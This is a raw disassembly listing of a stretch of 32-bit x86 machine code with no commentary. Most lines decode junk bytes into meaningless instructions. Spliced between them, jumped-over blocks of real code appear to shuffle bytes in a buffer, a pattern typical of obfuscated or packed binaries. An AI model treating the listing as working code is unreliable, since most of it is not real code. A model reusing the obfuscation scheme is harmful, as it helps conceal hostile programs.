  404436:	es adc dl,bh
  404439:	retf   0xb16e
  40443c:	stos   DWORD PTR es:[edi],eax
  40443d:	scas   al,BYTE PTR es:[edi]
  40443e:	cmc    
  40443f:	pop    esp
  404440:	xchg   edx,eax
  404441:	dec    ebx
  404442:	shl    ecx,1
  404444:	jle    0x404448
  404446:	repz mov bl,0x47
  404449:	scas   eax,DWORD PTR es:[edi]
  40444a:	sub    DWORD PTR [eax+0x54],eax
  40444d:	mov    al,0x49
  40444f:	scas   al,BYTE PTR es:[edi]
  404450:	scas   eax,DWORD PTR es:[edi]
  404451:	sahf   
  404452:	rcr    DWORD PTR [edi+ebx*4-0x2e153560],cl
  404459:	bound  ebx,QWORD PTR [ecx-0x1d0ad604]
  40445f:	adc    DWORD PTR [edi],edx
  404461:	sub    al,0x37
  404463:	(bad)  
  404464:	aad    0xc1
  404466:	das    
  404467:	pusha  
  404468:	pop    edi
  404469:	fldenv [ebx]
  40446b:	sub    eax,0x7fa4b91a
  404470:	pop    es
  404471:	or     DWORD PTR [ecx+0x26],esi
  404474:	fimul  DWORD PTR [ecx-0x4f1a42c2]
  40447a:	hlt    
  40447b:	push   ecx
  40447c:	fwait
  40447d:	cmp    eax,0x396bda9e
  404482:	sbb    eax,0xc00eba44
  404487:	fisubr WORD PTR [ebp-0x4ff4908a]
  40448d:	ret    
  40448e:	mov    ebx,DWORD PTR [ebp-0x10]
  404491:	jmp    0x4045f6
  404496:	psraw  mm6,0x10
  40449a:	out    0xfb,al
  40449c:	frstor ds:0xaa51ed7e
  4044a2:	sahf   
  4044a3:	jl     0x4044eb
  4044a5:	fs jle 0x4044c7
  4044a8:	jl     0x404526
  4044aa:	xor    al,0x7f
  4044ac:	jl     0x40452a
  4044ae:	dec    ebp
  4044af:	fistp  QWORD PTR [edx+0x51]
  4044b2:	jo     0x4044cb
  4044b4:	into   
  4044b5:	popf   
  4044b6:	sbb    ah,BYTE PTR [ecx+0x5a094cfc]
  4044bc:	xor    edi,DWORD PTR [edx-0x63a63fcb]
  4044c2:	js     0x404485
  4044c4:	sbb    BYTE PTR [esi],al
  4044c6:	xchg   esp,eax
  4044c7:	or     edx,DWORD PTR [eax+ebx*2+0x7c]
  4044cb:	mov    ebx,0x6b017cec
  4044d0:	aaa    
  4044d1:	ins    BYTE PTR es:[edi],dx
  4044d2:	pushf  
  4044d3:	mov    ecx,0xfeb1c8a8
  4044d8:	sbb    eax,0x41aa229b
  4044dd:	fsubr  DWORD PTR [eax-0xc]
  4044e0:	fsub   st,st(3)
  4044e2:	jb     0x404483
  4044e4:	cli    
  4044e5:	cmp    BYTE PTR [ecx+0x5f878045],al
  4044eb:	inc    esi
  4044ec:	pop    esi
  4044ed:	jne    0x4044d2
  4044ef:	rcl    edi,1
  4044f1:	stos   DWORD PTR es:[edi],eax
  4044f2:	jmp    0x73d0:0xc15559e7
  4044f9:	cmp    al,0x9d
  4044fb:	dec    eax
  4044fc:	js     0x4044be
  4044fe:	mov    eax,0x8d6be249
  404503:	cmp    eax,0xf18cc855
  404508:	(bad)  
  404509:	cmp    eax,0x87de6889
  40450e:	jb     0x404569
  404510:	jmp    0xe5:0x4535083
  404517:	out    dx,al
  404518:	mov    al,ds:0xab124c76
  40451d:	repnz aaa 
  40451f:	das    
  404520:	scas   eax,DWORD PTR es:[edi]
  404521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404522:	mov    ebp,0x9a3bb5b8
  404527:	inc    BYTE PTR [ecx+esi*2]
  40452a:	mov    edi,0x7b98499c
  40452f:	aas    
  404530:	jmp    0xd9b7:0xed81f76f
  404537:	inc    eax
  404538:	inc    eax
  404539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40453a:	sbb    DWORD PTR [edi+0x22fa75fd],ecx
  404540:	xor    BYTE PTR [eax+0x26],0xbf
  404544:	xchg   DWORD PTR [eax+0x21f195b4],ebp
  40454a:	addr16 dec ebx
  40454c:	xor    BYTE PTR [esi+0x12],0x8a
  404550:	repnz jmp 0xa17f:0x8aa2e56c
  404558:	out    0xba,al
  40455a:	inc    ebp
  40455b:	pop    es
  40455c:	hlt    
  40455d:	add    BYTE PTR [edx],bl
  40455f:	retf   
  404560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404561:	inc    ecx
  404562:	mov    eax,0xd0becebd
  404568:	mov    ecx,0x2eaf656c
  40456d:	ja     0x40452f
  40456f:	dec    esi
  404570:	clc    
  404571:	xchg   BYTE PTR [ebx],cl
  404573:	cdq    
  404574:	int    0xc1
  404576:	cld    
  404577:	mov    es,WORD PTR [esi]
  404579:	rol    BYTE PTR [edx-0x4e],1
  40457c:	cmp    bl,BYTE PTR [eax+0x4eb17295]
  404582:	jecxz  0x4045ed
  404584:	std    
  404585:	xor    DWORD PTR [esi],eax
  404587:	loop   0x4045e6
  404589:	jb     0x4045a4
  40458b:	sub    edx,DWORD PTR [ebx+0x820d568]
  404591:	jnp    0x404513
  404593:	jl     0x404532
  404595:	push   0xb2d064bc
  40459a:	ja     0x4045ac
  40459c:	pusha  
  40459d:	out    0xe8,al
  40459f:	cmp    al,0x8
  4045a1:	sub    ch,bl
  4045a3:	jmp    0x40458f
  4045a5:	bound  edx,QWORD PTR [ebx]
  4045a7:	mov    ?,WORD PTR [esi+0xf38a88a]
  4045ad:	xor    BYTE PTR [edx-0x47db4b27],0x67
  4045b4:	push   es
  4045b5:	fs jecxz 0x40453b
  4045b8:	sbb    ebp,DWORD PTR [edi]
  4045ba:	and    ebx,DWORD PTR [ebp-0x12]
  4045bd:	jmp    0x4045b5
  4045bf:	pop    edi
  4045c0:	scas   eax,DWORD PTR es:[edi]
  4045c1:	mov    esi,0x1a0c5800
  4045c6:	aas    
  4045c7:	sti    
  4045c8:	sub    ch,bh
  4045ca:	retf   
  4045cb:	adc    ch,BYTE PTR [ebx+0x7]
  4045ce:	adc    DWORD PTR [edi-0x63],0x63
  4045d2:	pop    ebp
  4045d3:	jno    0x4045ed
  4045d5:	and    cl,BYTE PTR [esi+0x57]
  4045d8:	call   0x700d:0x4493c3e6
  4045df:	adc    BYTE PTR [ebx+0x7e],dl
  4045e2:	int3   
  4045e3:	or     al,0xfc
  4045e5:	mov    edx,DWORD PTR [edx+0x46]
  4045e8:	ja     0x404609
  4045ea:	loop   0x404593
  4045ec:	adc    eax,0x22ca6ab3
  4045f1:	dec    esp
  4045f2:	ds int 0x5f
  4045f5:	jp     0x404622
  4045f7:	fistp  QWORD PTR [ebx]
  4045f9:	fimul  DWORD PTR [edi]
  4045fb:	xchg   DWORD PTR [eax],ecx
  4045fd:	add    BYTE PTR [eax],al
  4045ff:	add    BYTE PTR [ebx+0x27e9cc55],cl
  404605:	add    BYTE PTR [eax],al
  404607:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40460d:	cld    
  40460e:	xor    edx,eax
  404610:	xor    edi,eax
  404612:	add    edx,ecx
  404614:	add    edi,ecx
  404616:	imul   edx,edi
  404619:	mov    edi,DWORD PTR [ebp-0x8]
  40461c:	mov    ebx,DWORD PTR [ebp-0x10]
  40461f:	sub    ebx,edi
  404621:	cmp    ebx,edx
  404623:	mov    edx,DWORD PTR [ebp-0x38]
  404626:	jbe    0x40462f
  40462c:	mov    edx,DWORD PTR [ebp-0x3c]
  40462f:	mov    edi,DWORD PTR [ebp-0x4]
  404632:	xor    edi,eax
  404634:	xor    edx,eax
  404636:	add    edi,ecx
  404638:	add    edx,ecx
  40463a:	jmp    0x40479f
  40463f:	mov    WORD PTR [ecx+esi*8+0x3f],es
  404643:	dec    ecx
  404644:	(bad)  [esi+0x47]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	call   0x7fe4:0x8f10b2d5
  40464f:	ss push ds
  404651:	jl     0x4046cf
  404653:	xor    al,0x7f
  404655:	jl     0x4046d3
  404657:	fiadd  DWORD PTR [ebx+0x1a]
  40465a:	sti    
  40465b:	out    dx,al
  40465c:	sub    eax,0xe5b66bd
  404661:	xchg   esi,eax
  404662:	sbb    al,0x92
  404664:	inc    esi
  404665:	(bad)  
  404666:	adc    DWORD PTR [edi+0xf],esp
  404669:	inc    eax
  40466a:	cmp    eax,ebp
  40466c:	push   esi
  40466d:	xor    DWORD PTR [esi-0x4],ecx
  404670:	push   0x63
  404672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404673:	fisub  DWORD PTR [ecx+0x48]
  404676:	sub    al,0x3f
  404678:	add    eax,0x787c5517
  40467d:	sar    DWORD PTR [edx-0x771c98b2],cl
  404683:	add    BYTE PTR [ebx+0x525272f1],bh
  404689:	rcr    BYTE PTR [esp+esi*1],0x71
  40468d:	out    0xe,eax
  40468f:	pop    eax
  404690:	cmp    BYTE PTR [ecx],bh
  404692:	shr    BYTE PTR [eax],cl
  404694:	hlt    
  404695:	ficom  WORD PTR [ecx]
  404697:	data16 jo 0x404692
  40469a:	sbb    BYTE PTR [ecx-0x39],0x64
  40469e:	jl     0x40469a
  4046a0:	push   ebp
  4046a1:	sbb    ch,bh
  4046a3:	add    DWORD PTR ds:0xa0a084b4,ecx
  4046a9:	sub    al,0xb1
  4046ab:	rcr    BYTE PTR [edx+0x3d],0xff
  4046af:	or     edx,DWORD PTR [ebx+0x62391fc8]
  4046b5:	cmp    ah,BYTE PTR [esi]
  4046b7:	scas   al,BYTE PTR es:[edi]
  4046b8:	loop   0x404733
  4046ba:	int3   
  4046bb:	pop    esp
  4046bc:	inc    eax
  4046bd:	dec    eax
  4046be:	jno    0x4046ce
  4046c0:	icebp  
  4046c1:	xor    ah,bh
  4046c3:	adc    ebx,DWORD PTR [edx]
  4046c5:	jmp    0xe61d:0x3a658387
  4046cc:	xchg   edi,eax
  4046cd:	dec    ecx
  4046ce:	inc    ebx
  4046cf:	cmp    ecx,DWORD PTR [eax+0x5b]
  4046d2:	jns    0x40466f
  4046d4:	mov    eax,0x7e777166
  4046d9:	jbe    0x4046c2
  4046db:	xchg   ecx,eax
  4046dc:	xchg   esp,eax
  4046dd:	push   cs
  4046de:	adc    DWORD PTR [edi],esp
  4046e0:	aad    0x87
  4046e2:	and    BYTE PTR [ebp-0x40a6ab3f],bl
  4046e8:	inc    ebx
  4046e9:	aad    0xa8
  4046eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046ec:	and    DWORD PTR ds:0xdc90ed98,ecx
  4046f2:	mov    ah,0x3
  4046f4:	dec    edx
  4046f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f6:	mov    bl,0xe2
  4046f8:	jb     0x40469d
  4046fa:	dec    edx
  4046fb:	in     al,dx
  4046fc:	dec    esp
  4046fd:	les    eax,FWORD PTR [ecx+edx*1-0x2]
  404701:	mov    edi,0x77e5d919
  404706:	jbe    0x404702
  404708:	test   BYTE PTR [edx-0x78],bl
  40470b:	cli    
  40470c:	push   ebx
  40470d:	sub    DWORD PTR [ebp-0x8703ad],ebp
  404713:	data16 jle 0x404727
  404716:	cmc    
  404717:	mov    ch,dl
  404719:	add    eax,0x9fd326b5
  40471e:	mov    ch,0xba
  404720:	mov    esi,0x816af486
  404725:	test   eax,0x8c871225
  40472a:	adc    DWORD PTR [edx+0x2],ebx
  40472d:	jl     0x40476d
  40472f:	dec    edx
  404730:	xchg   edi,eax
  404731:	imul   dh
  404733:	scas   al,BYTE PTR es:[edi]
  404734:	inc    esi
  404735:	loopne 0x404767
  404737:	mov    esp,0xb08b3c51
  40473c:	pop    edi
  40473d:	push   ss
  40473e:	xchg   bh,ah
  404740:	in     eax,dx
  404741:	mov    ecx,0x932c1b6d
  404746:	into   
  404747:	sub    BYTE PTR ds:0x12ab3401,0x25
  40474e:	popf   
  40474f:	dec    esp
  404750:	scas   eax,DWORD PTR es:[edi]
  404751:	mov    ebx,0x81b3def0
  404756:	lods   al,BYTE PTR ds:[esi]
  404757:	hlt    
  404758:	or     DWORD PTR [edx+0x3903230d],eax
  40475e:	ja     0x404791
  404760:	sbb    al,0x20
  404762:	(bad)  
  404763:	stos   DWORD PTR es:[edi],eax
  404764:	aaa    
  404765:	dec    edx
  404766:	xor    edi,DWORD PTR [ebp-0x50c0b04b]
  40476c:	icebp  
  40476d:	ds int 0x9e
  404770:	xor    edx,DWORD PTR [ebp+0x65]
  404773:	push   0xbdad7b15
  404778:	dec    esi
  404779:	mov    ch,0x1a
  40477b:	push   ss
  40477c:	(bad)  
  40477d:	jno    0x40475b
  40477f:	mov    al,0xdf
  404781:	loopne 0x40472a
  404783:	pop    eax
  404784:	lods   al,BYTE PTR ds:[esi]
  404785:	sar    ebp,cl
  404787:	sub    ah,BYTE PTR [esi-0x29e6e87]
  40478d:	aad    0xf8
  40478f:	lods   al,BYTE PTR ds:[esi]
  404790:	jae    0x40472b
  404792:	into   
  404793:	mov    dh,0x95
  404795:	push   ss
  404796:	retf   
  404797:	xor    ah,BYTE PTR [edi]
  404799:	sbb    edi,edx
  40479b:	ja     0x404816
  40479d:	ja     0x404817
  40479f:	imul   edx,edi
  4047a2:	mov    DWORD PTR [ebp+0xc],edx
  4047a5:	mov    edx,DWORD PTR [ebp+0xc]
  4047a8:	mov    DWORD PTR [ebp-0x24],edx
  4047ab:	mov    edx,DWORD PTR [ebp-0x8]
  4047ae:	add    edx,DWORD PTR [ebp-0x40]
  4047b1:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  4047b8:	mov    DWORD PTR [ebp-0x1c],edx
  4047bb:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  4047c2:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4047c9:	mov    edx,DWORD PTR [ebp-0x18]
  4047cc:	xor    edx,eax
  4047ce:	add    edx,ecx
  4047d0:	jmp    0x404c6c
  4047d5:	mov    edx,DWORD PTR [ebp-0x18]
  4047d8:	xor    edx,eax
  4047da:	add    edx,DWORD PTR [ebp-0x14]
  4047dd:	mov    edi,DWORD PTR [ebp-0x1c]
  4047e0:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  4047e7:	mov    BYTE PTR [ebp+0xf],dl
  4047ea:	jmp    0x40494f
  4047ef:	int    0xf4
  4047f1:	mov    esi,0xfd66b566
  4047f6:	mov    ebx,0x8fce1da9
  4047fb:	lods   al,BYTE PTR ds:[esi]
  4047fc:	xor    edx,DWORD PTR [ecx+0x1d]
  4047ff:	mov    ss,WORD PTR [ecx]
  404801:	jl     0x40487f
  404803:	xor    al,0x7f
  404805:	jl     0x404883
  404807:	leave  
  404808:	pop    ebp
  404809:	icebp  
  40480a:	sbb    al,0xe5
  40480c:	push   ebp
  40480d:	sub    eax,0x9ac262fd
  404812:	rcr    BYTE PTR [edi],cl
  404814:	push   esi
  404815:	ins    BYTE PTR es:[edi],dx
  404816:	sbb    ch,dh
  404818:	pop    edx
  404819:	mov    edi,0x5eb157b
  40481e:	leave  
  40481f:	icebp  
  404820:	inc    esp
  404821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404822:	and    ch,BYTE PTR [edi+0x12991e9d]
  404828:	popf   
  404829:	inc    esp
  40482a:	sub    esp,eax
  40482c:	lock jnp 0x40480d
  40482f:	push   0x33
  404831:	ret    
  404832:	mov    cl,0x44
  404834:	inc    eax
  404835:	add    ch,BYTE PTR [eax+eiz*8-0x6818488f]
  40483c:	push   ebp
  40483d:	in     eax,dx
  40483e:	fmul   QWORD PTR [edx-0x4fce7738]
  404844:	or     BYTE PTR [eax],bh
  404846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404847:	xchg   edx,eax
  404848:	loope  0x404843
  40484a:	push   ecx
  40484b:	or     DWORD PTR [ecx+0x30],ecx
  40484e:	shl    DWORD PTR [ecx],cl
  404850:	jecxz  0x4047d7
  404852:	sti    
  404853:	sub    BYTE PTR [ebp+0x34],ah
  404856:	push   edx
  404857:	add    eax,0xb89363b6
  40485c:	and    DWORD PTR [ecx],edi
  40485e:	loopne 0x4048ac
  404860:	test   al,0x4c
  404862:	inc    edx
  404863:	adc    si,WORD PTR [ecx+0x32ac7a32]
  40486a:	xchg   ebx,eax
  40486b:	xor    BYTE PTR [ecx-0x746f5db4],dl
  404871:	xchg   DWORD PTR [edi+0x1c],ecx
  404874:	pop    esi
  404875:	lock mov ds:0xa526de21,al
  40487b:	sbb    BYTE PTR [edx+0x777f265d],al
  404881:	or     al,BYTE PTR [ebx+0x3b]
  404884:	test   DWORD PTR [edi+0x41],esi
  404887:	or     eax,DWORD PTR [esi]
  404889:	cdq    
  40488a:	and    al,0x18
  40488c:	(bad)  
  40488d:	hlt    
  40488e:	pop    edi
  40488f:	dec    esi
  404890:	test   eax,0xb82137c3
  404895:	adc    dl,BYTE PTR [edx]
  404897:	(bad)  
  404898:	retf   
  404899:	jecxz  0x4048b1
  40489b:	in     al,dx
  40489c:	push   ds
  40489d:	push   edx
  40489e:	jb     0x4048e6
  4048a0:	ins    DWORD PTR es:[edi],dx
  4048a1:	pop    edx
  4048a2:	add    DWORD PTR [ebx-0x8],ebp
  4048a5:	xor    DWORD PTR [esi+0x2f],ecx
  4048a8:	jmp    0xa75f:0x55a225de
  4048af:	sbb    BYTE PTR [ebp+0x73],ah
  4048b2:	pop    es
  4048b3:	push   ds
  4048b4:	jns    0x404879
  4048b6:	push   esp
  4048b7:	sub    esi,ecx
  4048b9:	xchg   ecx,eax
  4048ba:	push   ds
  4048bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048bc:	mov    bl,0xa7
  4048be:	jb     0x4048b3
  4048c0:	mov    ds:0x46ab72ec,al
  4048c5:	(bad)  
  4048c7:	imul   edi,edx,0x3f941f66
  4048cd:	mov    BYTE PTR [ebp-0xb71a951],dl
  4048d3:	in     al,0x83
  4048d5:	test   eax,0xb9267102
  4048da:	add    eax,0xd1b3b0f1
  4048df:	add    BYTE PTR ds:0x41b256c4,ch
  4048e5:	push   esi
  4048e6:	(bad)  
  4048e7:	xchg   ebp,eax
  4048e8:	adc    ah,cl
  4048ea:	xlat   BYTE PTR ds:[bx]
  4048ec:	stc    
  4048ed:	mov    ah,0x94
  4048ef:	scas   al,BYTE PTR es:[edi]
  4048f0:	fdivr  QWORD PTR [esi-0x55]
  4048f3:	dec    ecx
  4048f4:	pop    eax
  4048f5:	xchg   esp,eax
  4048f6:	in     eax,0xe6
  4048f8:	adc    al,BYTE PTR [edi+ecx*4-0x1a3eb0ce]
  4048ff:	stc    
  404900:	and    BYTE PTR [eax-0x4e7cc6fa],bl
  404906:	aas    
  404907:	scas   al,BYTE PTR es:[edi]
  404908:	dec    esp
  404909:	bound  edi,QWORD PTR [esi]
  40490b:	sbb    al,0xbb
  40490d:	fwait
  40490e:	sub    dh,ah
  404910:	mov    dl,0x41
  404912:	inc    eax
  404913:	mov    esi,0x418b639b
  404918:	add    DWORD PTR [edi-0x20],esp
  40491b:	and    dl,0x87
  40491e:	dec    esi
  40491f:	ror    BYTE PTR [eax],0x40
  404922:	pop    ds
  404923:	push   esi
  404924:	(bad)  
  404925:	push   ecx
  404926:	test   BYTE PTR [ebp-0x9be3e4c],dl
  40492c:	sub    eax,0x23e7e205
  404931:	ror    BYTE PTR [eax],0x72
  404934:	mov    cl,0x60
  404936:	loop   0x404999
  404938:	pop    esi
  404939:	jp     0x404964
  40493b:	(bad)  
  40493c:	push   edi
  40493d:	mov    ecx,0x50013573
  404942:	rcl    BYTE PTR [esi],0x2a
  404945:	push   edi
  404946:	xor    BYTE PTR [ebp-0x2c43a707],al
  40494c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40494d:	std    
  40494e:	mov    BYTE PTR [ebx-0x2fcc0bab],cl
  404954:	add    edx,DWORD PTR [ebp-0x14]
  404957:	mov    edi,DWORD PTR [ebp-0x1c]
  40495a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  404961:	mov    BYTE PTR [ebp+0xb],dl
  404964:	mov    dl,BYTE PTR [ebp+0xf]
  404967:	mov    edi,DWORD PTR [ebp-0xc]
  40496a:	xor    edi,eax
  40496c:	add    edi,DWORD PTR [ebp-0x14]
  40496f:	mov    ebx,DWORD PTR [ebp-0x1c]
  404972:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404979:	jmp    0x404ade
  40497e:	adc    ebx,DWORD PTR cs:[ecx]
  404981:	iret   
  404982:	sbb    eax,0xb1d5e6fd
  404987:	and    edi,DWORD PTR ss:[ebx+0x321dabe9]
  40498e:	inc    esi
  40498f:	adc    BYTE PTR [esp+edi*2+0x34],bh
  404993:	jg     0x404a11
  404995:	jl     0x4049ef
  404997:	ss popf 
  404999:	repnz popa 
  40499b:	inc    edx
  40499c:	pop    ecx
  40499d:	ret    0x1686
  4049a0:	inc    edx
  4049a1:	push   edx
  4049a2:	ja     0x404975
  4049a4:	dec    ecx
  4049a5:	lahf   
  4049a6:	aad    0xe8
  4049a8:	sti    
  4049a9:	ds inc ebp
  4049ab:	ret    
  4049ac:	cli    
  4049ad:	aad    0xa0
  4049af:	or     dl,bh
  4049b1:	jecxz  0x4049dc
  4049b3:	in     al,dx
  4049b4:	push   esi
  4049b5:	jmp    0x4049f9
  4049b7:	xor    ecx,DWORD PTR [eax+0x11032979]
  4049bd:	xchg   edi,eax
  4049be:	pop    ebx
  4049bf:	dec    esp
  4049c0:	sub    ah,bh
  4049c2:	adc    ebx,ecx
  4049c4:	rcl    DWORD PTR [edi+0x37],1
  4049c7:	fldenv [eax+edi*8]
  4049ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049cb:	out    0x1f,al
  4049cd:	loopne 0x404a14
  4049cf:	out    dx,al
  4049d0:	jmp    0x2593:0xa1a6d581
  4049d7:	retf   
  4049d8:	popa   
  4049d9:	cdq    
  4049da:	scas   eax,DWORD PTR es:[edi]
  4049db:	je     0x4049e8
  4049dd:	mov    al,0x55
  4049df:	cmp    eax,0xc3c4719a
  4049e4:	dec    ebx
  4049e5:	fmul   DWORD PTR [edi+ecx*8+0x18]
  4049e9:	xchg   DWORD PTR [ebx],ebp
  4049eb:	inc    edi
  4049ec:	cmp    DWORD PTR [ebx+0x1122fe2f],edx
  4049f2:	sbb    ch,BYTE PTR [esi-0xb2618cf]
  4049f8:	(bad)  
  4049f9:	jle    0x404a5f
  4049fb:	arpl   WORD PTR [eax-0x3d],bx
  4049fe:	mov    BYTE PTR ds:0x5e4d231c,dh
  404a04:	push   esi
  404a05:	push   ds
  404a06:	pop    ebp
  404a07:	jecxz  0x4049e1
  404a09:	imul   edx,DWORD PTR [eax-0x7cc24041],0x8dfe49ed
  404a13:	je     0x4049b8
  404a15:	xor    DWORD PTR [ebp+0x40],esi
  404a18:	cs jb  0x404a87
  404a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a1c:	push   es
  404a1d:	add    esp,DWORD PTR [ecx+0xea70052]
  404a23:	aam    0xde
  404a25:	pop    edi
  404a26:	add    al,0x1d
  404a28:	in     al,dx
  404a29:	or     al,BYTE PTR [ecx+0x4]
  404a2c:	dec    esi
  404a2d:	jge    0x404a2e
  404a2f:	pop    ebx
  404a30:	arpl   WORD PTR [edx],di
  404a32:	scas   al,BYTE PTR es:[edi]
  404a33:	aad    0x31
  404a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a36:	add    ebp,0x40
  404a39:	mov    cl,0xd2
  404a3b:	push   esp
  404a3c:	sti    
  404a3d:	and    eax,DWORD PTR [edx+0x41b4f6c5]
  404a43:	adc    edx,DWORD PTR [ecx-0x70]
  404a46:	ins    BYTE PTR es:[edi],dx
  404a47:	jns    0x404a5f
  404a49:	pop    di
  404a4b:	clc    
  404a4c:	fistp  QWORD PTR [esi+0x1e9b82f6]
  404a52:	push   eax
  404a53:	daa    
  404a54:	sbb    BYTE PTR ds:0x8254cda9,cl
  404a5a:	in     al,0x8c
  404a5c:	push   edi
  404a5d:	and    DWORD PTR [ecx+0x46cadda6],0x630a8616
  404a67:	sbb    eax,0x660f9d51
  404a6c:	fistp  DWORD PTR [ecx-0x17]
  404a6f:	ss pop eax
  404a71:	cmp    ebx,ebp
  404a73:	out    dx,eax
  404a74:	nop
  404a75:	cli    
  404a76:	mov    al,0x7b
  404a78:	call   0x353fcf1f
  404a7d:	cmp    edx,DWORD PTR [ecx-0x7554efab]
  404a83:	pop    esi
  404a84:	xchg   BYTE PTR [edx-0x5c],ah
  404a87:	and    ebp,edi
  404a89:	or     al,0x4a
  404a8b:	sbb    DWORD PTR [ebx+0x5521c76c],esp
  404a91:	scas   eax,DWORD PTR es:[edi]
  404a92:	pop    ebx
  404a93:	dec    ebp
  404a94:	mov    dl,BYTE PTR [ebp-0x108966ca]
  404a9a:	les    edx,FWORD PTR [ebx+0x6f937729]
  404aa0:	pop    ss
  404aa1:	pop    es
  404aa2:	adc    ebx,DWORD PTR [esp+ebx*4-0x9cccc76]
  404aa9:	xor    al,0xba
  404aab:	sbb    BYTE PTR [ebp-0x24c02ef5],cl
  404ab1:	lock or BYTE PTR [edi-0x51abd6b8],0x3f
  404ab9:	mov    WORD PTR [ebp+0x2e],ds
  404abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404abd:	enter  0x5bde,0xf6
  404ac1:	ror    eax,1
  404ac3:	mov    ebx,0xdad1293f
  404ac8:	loopne 0x404b12
  404aca:	mov    bl,0x5
  404acc:	rep lods eax,DWORD PTR ds:[esi]
  404ace:	inc    ebx
  404acf:	hlt    
  404ad0:	aad    0x7b
  404ad2:	hlt    
  404ad3:	hlt    
  404ad4:	jmp    0x404adf
  404ad6:	push   0xe553be75
  404adb:	adc    al,0x37
  404add:	pop    ebp
  404ade:	mov    dl,BYTE PTR [ebp+0xb]
  404ae1:	mov    edi,DWORD PTR [ebp-0x18]
  404ae4:	xor    edi,eax
  404ae6:	add    edi,DWORD PTR [ebp-0x14]
  404ae9:	mov    ebx,DWORD PTR [ebp-0x1c]
  404aec:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404af3:	mov    edx,DWORD PTR [ebp-0x44]
  404af6:	mov    edi,DWORD PTR [ebp-0xc]
  404af9:	xor    edx,eax
  404afb:	xor    edi,eax
  404afd:	add    edx,ecx
  404aff:	add    edi,ecx
  404b01:	imul   edx,edi
  404b04:	add    edx,DWORD PTR [ebp-0x14]
  404b07:	jmp    0x404c6c
  404b0c:	stos   DWORD PTR es:[edi],eax
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	cmp    al,0x3d
  404b10:	fnstsw WORD PTR [ebp+0x313d6e7d]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	sbb    eax,0xbfdd3665
  404b1c:	push   ds
  404b1d:	adc    bh,BYTE PTR [esp+edi*2+0x34]
  404b21:	jg     0x404b9f
  404b23:	jl     0x404b0a
  404b25:	scas   eax,DWORD PTR es:[edi]
  404b26:	adc    BYTE PTR [ebp-0x80],bh
  404b29:	pop    esi
  404b2a:	xor    DWORD PTR [ebp+0x19],eax
  404b2d:	leave  
  404b2e:	push   0x3f56692f
  404b33:	stos   DWORD PTR es:[edi],eax
  404b34:	jl     0x404b24
  404b36:	cmp    eax,0x74309a51
  404b3b:	sbb    BYTE PTR [ebx],al
  404b3d:	fwait
  404b3e:	xchg   edi,eax
  404b3f:	in     al,dx
  404b40:	inc    esi
  404b41:	jp     0x404acf
  404b43:	pop    ebx
  404b44:	(bad)  [edi-0x396ccbf5]
  404b4a:	shl    BYTE PTR [ebp-0x1ea922a4],0xe5
  404b51:	int    0x8
  404b53:	rcl    DWORD PTR [esi+eiz*8],0xf6
  404b57:	(bad)  
  404b58:	imul   esi,edx,0x75
  404b5b:	bound  ecx,QWORD PTR gs:[edx+0x3a3e44ba]
  404b62:	xchg   ebp,eax
  404b63:	lahf   
  404b64:	clc    
  404b65:	xchg   ebx,eax
  404b66:	inc    esp
  404b67:	dec    edi
  404b68:	div    DWORD PTR [esi+0x2a94c661]
  404b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b6f:	lods   al,BYTE PTR ds:[esi]
  404b70:	sti    
  404b71:	sub    al,0xcb
  404b73:	aaa    
  404b74:	fisttp QWORD PTR [esi]
  404b76:	sub    BYTE PTR [ecx-0x50],ah
  404b79:	xchg   DWORD PTR [edx-0xe],edi
  404b7c:	(bad)  
  404b7d:	data16 test dl,0xd8
  404b81:	jbe    0x404ba6
  404b83:	sbb    ebx,eax
  404b85:	ja     0x404bc2
  404b87:	mov    esp,0x31cc480e
  404b8c:	pop    ebp
  404b8d:	gs in  eax,0xfc
  404b90:	push   es
  404b91:	test   DWORD PTR [ebx],ecx
  404b93:	dec    eax
  404b94:	std    
  404b95:	cld    
  404b96:	aas    
  404b97:	add    ebx,DWORD PTR [ebx]
  404b99:	mov    ebx,0x99b8733b
  404b9e:	ret    0x2984
  404ba1:	std    
  404ba2:	js     0x404b96
  404ba4:	clc    
  404ba5:	enter  0x2d90,0xe2
  404ba9:	mov    dl,0x30
  404bab:	pop    ecx
  404bac:	add    DWORD PTR [esi],ebp
  404bae:	das    
  404baf:	inc    BYTE PTR [edx+0x495a60d0]
  404bb5:	fldcw  WORD PTR [ecx+0x1c]
  404bb8:	pop    ecx
  404bb9:	lods   al,BYTE PTR ds:[esi]
  404bba:	and    BYTE PTR [ecx-0x5c],cl
  404bbd:	or     DWORD PTR [ebp+0x33935056],edi
  404bc3:	jg     0x404b79
  404bc5:	rol    DWORD PTR [esi-0x16],1
  404bc8:	popf   
  404bc9:	jb     0x404b52
  404bcb:	xchg   ecx,eax
  404bcc:	adc    ah,dh
  404bce:	mov    BYTE PTR [ecx+edi*2+0x73efc84c],bl
  404bd5:	adc    BYTE PTR [eax-0x78],dh
  404bd8:	or     dl,BYTE PTR [ecx-0x3]
